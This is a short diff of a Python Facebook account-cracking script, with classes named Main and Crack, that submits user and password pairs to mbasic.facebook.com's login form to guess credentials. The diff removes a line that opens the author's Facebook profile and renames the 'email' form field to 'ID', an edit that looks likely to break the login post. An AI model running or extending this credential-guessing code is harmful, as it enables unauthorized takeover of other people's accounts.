@@ -77,7 +77,6 @@ class Main:
 			exit(" ! Your token Expired ! ")
 		print(
 			f" >> Your Account: {info['name']}, {info['id']} << " 
-os.system('xdg-open https://www.facebook.com/PREKASH.I.AM.HACKER.Im.silent')
 		)
 		print(
 			"""
@@ -197,7 +196,7 @@ class Crack:
 				form = ress.find('form',{'method':'post'})
 				data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
 				data2.update({
-					'email':user,
+					'ID':user,
 					'pass':pw
 				})
 				res = session.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
